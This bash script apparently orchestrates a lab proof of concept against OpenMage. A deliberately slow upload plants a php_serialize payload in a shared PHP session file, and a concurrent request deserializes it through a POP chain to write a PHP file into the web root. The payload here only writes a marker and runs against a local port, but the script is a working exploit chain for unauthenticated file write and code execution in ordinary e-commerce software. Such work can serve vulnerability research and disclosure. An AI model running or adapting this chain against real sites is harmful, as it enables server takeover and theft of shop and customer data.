#!/bin/bash
# PIE end-to-end: slow upload -> php_serialize writer -> shared session file ->
# concurrent app request (PIE php-fpm) session_start -> POP chain -> file write.
set -u
R=/tmp/opencode/research/openmage_pop_20261022T021222Z
cd "$R" || exit 1
SID=pietest3
S=www/var/session/sess_$SID
rm -f www/pop_pie_e2e.php markers/MARK_PIE_E2E "$S"
M=$R/markers/MARK_PIE_E2E
CODE="<?php file_put_contents('$M','PIE-E2E '.date('c').' pid='.getmypid().' sapi='.php_sapi_name().' bin='.PHP_BINARY.PHP_EOL,FILE_APPEND); echo 'PIE_E2E_OK'.PHP_EOL; ?>"
python3 scripts/mkpay.py pop "$R/www/pop_pie_e2e.php" "$CODE" phase/pop_pie_e2e.bin || exit 1
python3 scripts/upload_probe.py --port 28897 --path /lab_upload_sink.php --sid "$SID" \
    --payload-file phase/pop_pie_e2e.bin --size 1048576 --mode slow --pause-at 262144 \
    --pause-seconds 12 --session-file "$S" --outdir phase > phase/pie_e2e_upload.out 2>&1 &
PID=$!
for i in $(seq 1 200); do
    if [ -f "$S" ] && [ "$(stat -c%s "$S" 2>/dev/null || echo 0)" -gt 800 ]; then break; fi
    sleep 0.1
done
cp -a "$S" phase/pie_e2e_sess_at_read.bin 2>/dev/null || true
stat -c '%s bytes %n' phase/pie_e2e_sess_at_read.bin 2>/dev/null || echo "no session-at-read copy"
python3 scripts/get_app.py 28897 "$SID" / req/pie_e2e_reader
ls -la www/pop_pie_e2e.php 2>&1
wait $PID
echo "---- upload log ----"
cat phase/pie_e2e_upload.out
